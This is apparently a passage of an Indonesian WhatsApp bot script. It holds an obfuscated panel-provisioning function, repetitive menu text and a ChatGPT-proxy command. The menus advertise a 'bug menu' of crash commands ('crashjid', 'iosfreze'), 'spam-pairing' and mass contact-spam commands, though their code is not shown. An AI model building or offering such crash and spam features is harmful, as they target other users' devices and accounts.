cpanell(_0x12d5f1,_0x373af2,_0x1dc0a7,_0x39e37e){const _0x52026c=_0x4405;let _0x16b3c1=_0x12d5f1,_0x3fa4d7=m[_0x52026c(0x1c8)]?m['quoted'][_0x52026c(0x1dc)]:_0x373af2?_0x373af2['replace'](/[^0-9]/g,'')+_0x52026c(0x1cb):m[_0x52026c(0x1c5)][0x0],_0x52a390=_0x16b3c1,_0x3b5b3f=global[_0x52026c(0x1bd)],_0x1c8ab6=global[_0x52026c(0x1de)],_0x2488d0=_0x1dc0a7,_0xd195d5=_0x39e37e,_0x459c27=_0x1dc0a7,_0x21e79c=_0x16b3c1+_0x52026c(0x1b0);try{if(!_0x3fa4d7)return;let _0x5c7155=(await kyami[_0x52026c(0x1c6)](_0x3fa4d7[_0x52026c(0x1b9)]`@`[0x0]))[0x0]||{},_0x28f193=generateRandomPassword(0x5),_0x3b4d66=await fetch(domain+_0x52026c(0x1b8),{'method':_0x52026c(0x1bf),'headers':{'Accept':_0x52026c(0x1ad),'Content-Type':_0x52026c(0x1ad),'Authorization':_0x52026c(0x1b4)+apikey},'body':JSON[_0x52026c(0x1ae)]({'email':_0x21e79c,'username':_0x16b3c1,'first_name':_0x16b3c1,'last_name':_0x16b3c1,'language':'en','password':_0x28f193})}),_0x359dca=await _0x3b4d66[_0x52026c(0x1c2)]();if(_0x359dca[_0x52026c(0x1ce)])return reply(JSON['stringify'](_0x359dca[_0x52026c(0x1ce)][0x0],null,0x2));let _0x5b6a05=_0x359dca[_0x52026c(0x1b7)],_0x4a4c61=await fetch(domain+'/api/application/nests/5/eggs/'+_0x3b5b3f,{'method':_0x52026c(0x1c7),'headers':{'Accept':_0x52026c(0x1ad),'Content-Type':'application/json','Authorization':'Bearer\x20'+apikey}});const _0xdac799=_0x52026c(0x1c9)+_0x3fa4d7[_0x52026c(0x1b9)]`@`[0x0]+_0x52026c(0x1d0)+_0x5b6a05[_0x52026c(0x1d8)]+'\x0a⎙─➤\x20*🔐PASSWORD*\x20:\x20'+_0x28f193+_0x52026c(0x1b6)+domain+_0x52026c(0x1be)+date+'\x0a\x0a'+tekspanel+'\x0a';kyami[_0x52026c(0x1d7)](_0x3fa4d7,{'caption':_0xdac799,'image':fs[_0x52026c(0x1c4)](_0x52026c(0x1d5))});let _0x2eea65=await _0x4a4c61['json'](),_0x379a3d=_0x2eea65['attributes'][_0x52026c(0x1d9)],_0x421cbf=await fetch(domain+_0x52026c(0x1cc),{'method':_0x52026c(0x1bf),'headers':{'Accept':_0x52026c(0x1ad),'Content-Type':_0x52026c(0x1ad),'Authorization':_0x52026c(0x1b4)+apikey},'body':JSON[_0x52026c(0x1ae)]({'name':_0x52a390,'description':'\x20','user':_0x5b6a05['id'],'egg':parseInt(_0x3b5b3f),'docker_image':_0x52026c(0x1df),'startup':_0x379a3d,'environment':{'INST':_0x52026c(0x1c0),'USER_UPLOAD':'0','AUTO_UPDATE':'0','CMD_RUN':_0x52026c(0x1c1)},'limits':{'memory':_0x2488d0,'swap':0x0,'disk':_0x459c27,'io':0x1f4,'cpu':_0xd195d5},'feature_limits':{'databases':0x5,'backups':0x5,'allocations':0x1},'deploy':{'locations':[parseInt(_0x1c8ab6)],'dedicated_ip':![],'port_range':[]}})}),_0x262f7b=await _0x421cbf[_0x52026c(0x1c2)]();if(_0x262f7b[_0x52026c(0x1ce)])return reply(JSON[_0x52026c(0x1ae)](_0x262f7b['errors'][0x0],null,0x2));let _0x3d1c5a=_0x262f7b['attributes'],_0x349b81=await reply(_0x52026c(0x1bb)+_0x5b6a05['id']+_0x52026c(0x1bc)+_0x5b6a05['first_name']+'\x20'+_0x5b6a05['last_name']+'\x0aMEMORY:\x20'+(_0x3d1c5a[_0x52026c(0x1c3)][_0x52026c(0x1d4)]===0x0?_0x52026c(0x1ba):_0x3d1c5a[_0x52026c(0x1c3)][_0x52026c(0x1d4)])+'\x20MB\x0aDISK:\x20'+(_0x3d1c5a['limits'][_0x52026c(0x1b5)]===0x0?'Unlimited':_0x3d1c5a[_0x52026c(0x1c3)][_0x52026c(0x1b5)])+_0x52026c(0x1ac)+_0x3d1c5a[_0x52026c(0x1c3)][_0x52026c(0x1da)]+_0x52026c(0x1cf));}catch(_0x3d6553){console[_0x52026c(0x1dd)](_0x3d6553),reply(_0x52026c(0x1b2));}}
// Command handler
switch (command) {
case'tes':{
    if (limitnya < 1000) return reply(`tidak cukup limitmu`)
    reply(`${db.data.users[sender].premium}`)
}
    break
case'menu':{
if (!users.registered) return reply(mess.daftar)
reaction(m.chat, "⏳")
if (args.length < 1) return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`VERSION\` : ${namabot}
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`TOTAL PENGGUNA\` : ${totalreg}
▧ \`DATE\` : ${date}

▧ L I S T  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}menu all
│ • ${prefix}menu owner
│ • ${prefix}menu main
│ • ${prefix}menu tools
│ • ${prefix}menu download
│ • ${prefix}menu ai
│ • ${prefix}menu group
│ • ${prefix}menu panel
│ • ${prefix}menu info 
│ • ${prefix}menu search
│ • ${prefix}menu bug
│ • ${prefix}menu quotes
│ • ${prefix}menu pushkontak
└───···`)

if (args[0] === "all") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`VERSION\` : ${namabot}
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧ O W N E R  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}autoread
│ • ${prefix}backup
│ • ${prefix}restart
│ • ${prefix}addlimit
│ • ${prefix}self/public
│ • ${prefix}customsn
│ • ${prefix}enc
│ • ${prefix}spam-pairing
│ • ${prefix}bcgc
│ • ${prefix}buathadiah
│ • ${prefix}listhadiah
│ • ${prefix}joingc
└───···

▧ M A I N  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}reportbug
│ • ${prefix}request
│ • ${prefix}ceklimit
│ • ${prefix}ceksn Ⓛ︎
│ • ${prefix}daftar
│ • ${prefix}unregister
│ • ${prefix}redeemcode
│ • ${prefix}claim/daily
└───···

▧  T O O L S  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}hd Ⓛ︎
│ • ${prefix}remini Ⓛ︎
│ • ${prefix}tourl Ⓛ︎
│ • ${prefix}readviewonce Ⓛ︎
│ • ${prefix}smeme
│ • ${prefix}sticker
└───···

▧ D O W N L O A D  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}play Ⓛ︎
│ • ${prefix}tiktokvideo Ⓛ︎
│ • ${prefix}tiktokslide Ⓛ︎
│ • ${prefix}gdrive Ⓛ︎
│ • ${prefix}mediafire Ⓛ︎
│ • ${prefix}sfiledl Ⓛ︎
│ • ${prefix}capcut Ⓛ︎
│ • ${prefix}ytmp4 Ⓛ︎
│ • ${prefix}ytmp3 Ⓛ︎
└───···

▧ A I  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}ai on/off
│ • ${prefix}ai
│ • ${prefix}gpt4
│ • ${prefix}gpt4ai
│ • ${prefix}openai
└───···

▧ G R O U P  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}open
│ • ${prefix}close
│ • ${prefix}promote
│ • ${prefix}demote
│ • ${prefix}afk
│ • ${prefix}hidetag
│ • ${prefix}kick
│ • ${prefix}delete
│ • ${prefix}antilinkgc on/off
│ • ${prefix}antivirtex on/off
└───···

▧ P A N E L  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}cpanel *1gb nama nomer*
│ • ${prefix}addadmin *nama nomer*
│ • ${prefix}delpanel *id server*
│ • ${prefix}deladmin *id admin*
│ • ${prefix}ramlist
│ • ${prefix}listserver
│ • ${prefix}listadmin
└───···

▧ I N F O  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}script
│ • ${prefix}ping
└───···

▧ S E A R C H  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}play Ⓛ︎
│ • ${prefix}pinterest Ⓛ︎
│ • ${prefix}ytsearch Ⓛ︎
└───···

▧ B U G  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}oribug
│ • ${prefix}crashjid
└───···

▧ P U S H  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}idgc
│ • ${prefix}listgc
│ • ${prefix}pushkontak
│ • ${prefix}pushkontak1
│ • ${prefix}pushkontak2
│ • ${prefix}savekontak
│ • ${prefix}savekontak2
└───···

▧ Q U O T E S  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}quotesanime
│ • ${prefix}quotedbacot
└───···
`)
} else if (args[0] === "panel") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`VERSION\` : ${namabot}
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧ P A N E L  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}cpanel *1gb nama nomer*
│ • ${prefix}addadmin *nama nomer*
│ • ${prefix}delpanel *id server*
│ • ${prefix}deladmin *id admin*
│ • ${prefix}ramlist
│ • ${prefix}listserver
│ • ${prefix}listadmin
└───···`)
} else if (args[0] === "owner") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`VERSION\` : ${namabot}
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧ O W N E R  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}autoread
│ • ${prefix}backup
│ • ${prefix}restart
│ • ${prefix}addlimit
│ • ${prefix}self/public
│ • ${prefix}customsn
│ • ${prefix}enc
│ • ${prefix}spam-pairing
│ • ${prefix}bcgc
│ • ${prefix}clearsession
│ • ${prefix}buathadiah
│ • ${prefix}listhadiah
│ • ${prefix}joingc
└───···`)
} else if (args[0] === "main") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`VERSION\` : ${namabot}
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧ M A I N  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}reportbug
│ • ${prefix}request
│ • ${prefix}ceklimit
│ • ${prefix}ceksn Ⓛ︎
│ • ${prefix}daftar
│ • ${prefix}unregister
│ • ${prefix}redeemcode
│ • ${prefix}claim/daily
└───···
`)
} else if (args[0] === "tools") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`VERSION\` : ${namabot}
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧  T O O L S  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}hd Ⓛ︎
│ • ${prefix}remini Ⓛ︎
│ • ${prefix}tourl Ⓛ︎
│ • ${prefix}readviewonce Ⓛ︎
│ • ${prefix}smeme
│ • ${prefix}sticker
└───···
`)
} else if (args[0] === "download") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`VERSION\` : ${namabot}
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧ D O W N L O A D  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}play Ⓛ︎
│ • ${prefix}tiktokvideo Ⓛ︎
│ • ${prefix}tiktokslide Ⓛ︎
│ • ${prefix}gdrive Ⓛ︎
│ • ${prefix}mediafire Ⓛ︎
│ • ${prefix}sfiledl Ⓛ︎
│ • ${prefix}capcut Ⓛ︎
│ • ${prefix}ytmp4 Ⓛ︎
│ • ${prefix}ytmp3 Ⓛ︎
└───···
`)

} else if (args[0] === "ai") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜* 📖
▧ LIMIT : ${db.data.users[sender].limit}
▧ STATUS USER : ${isPremium ? 'premium' : 'free user'}
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ DATE : ${date}

▧ A I  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}autoai on/off
│ • ${prefix}ai
│ • ${prefix}gpt4
│ • ${prefix}gpt4ai
│ • ${prefix}openai
└───···
`)
} else if (args[0] === "group") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`VERSION\` : ${namabot}
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧ G R O U P  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}open
│ • ${prefix}close
│ • ${prefix}promote
│ • ${prefix}demote
│ • ${prefix}afk
│ • ${prefix}hidetag
│ • ${prefix}kick
│ • ${prefix}delete
│ • ${prefix}antilinkgc on/off
│ • ${prefix}antivirtex on/off
└───···
`)

} else if (args[0] === "ai") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜* 📖
▧ LIMIT : ${db.data.users[sender].limit}
▧ STATUS USER : ${isPremium ? 'premium' : 'free user'}
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ DATE : ${date}

▧ P A N E L  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}cpanel *1gb nama nomer*
│ • ${prefix}addadmin *nama nomer*
│ • ${prefix}delpanel *id server*
│ • ${prefix}deladmin *id admin*
│ • ${prefix}ramlist
│ • ${prefix}listserver
│ • ${prefix}listadmin
└───···
`)

} else if (args[0] === "info") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`VERSION\` : ${namabot}
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧ I N F O  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}script
│ • ${prefix}ping
└───···
`)
} else if (args[0] === "search") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`VERSION\` : ${namabot}
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧ S E A R C H  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}play Ⓛ︎
│ • ${prefix}pinterest Ⓛ︎
│ • ${prefix}ytsearch Ⓛ︎
└───···`)
} else if (args[0] === "bug") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`VERSION\` : ${namabot}
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧ B U G  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}oribug
│ • ${prefix}crashjid
│ • ${prefix}iosfreze
└───···`)
} else if (args[0] === "pushkontak") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`VERSION\` : ${namabot}
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧ P U S H  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}idgc
│ • ${prefix}listgc
│ • ${prefix}pushkontak
│ • ${prefix}pushkontak1
│ • ${prefix}pushkontak2
│ • ${prefix}savekontak
│ • ${prefix}savekontak2
└───···

`)
} else if (args[0] === "quotes") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`VERSION\` : ${namabot}
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧ Q U O T E S  M E N U 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜
│ • ${prefix}quotesanime Ⓛ︎
│ • ${prefix}quotesbacot Ⓛ︎
└───···`)
}
}
break
/*
 - *[ Fitur Ai Gpt4 - By Deku ]*
 - https://whatsapp.com/channel/0029VadFS3r89inc7Jjus03W
*/
case 'gpt4': case 'ai': case 'gpt4ai': case 'openai': {

if (!text) return m.reply(`${command} halo`)

try {
const airyzen = await (await fetch(`https://api.ryzendesu.vip/api/ai/chatgpt?text=Lu%20Adalah%20ChatGPT%20Bahasa%20Bergaul&prompt=${text}`)).json()
let data = airyzen.response

m.reply(data)
} catch {
m.reply("maaf error")
}
}
break
/*
 - Fitur Capcut
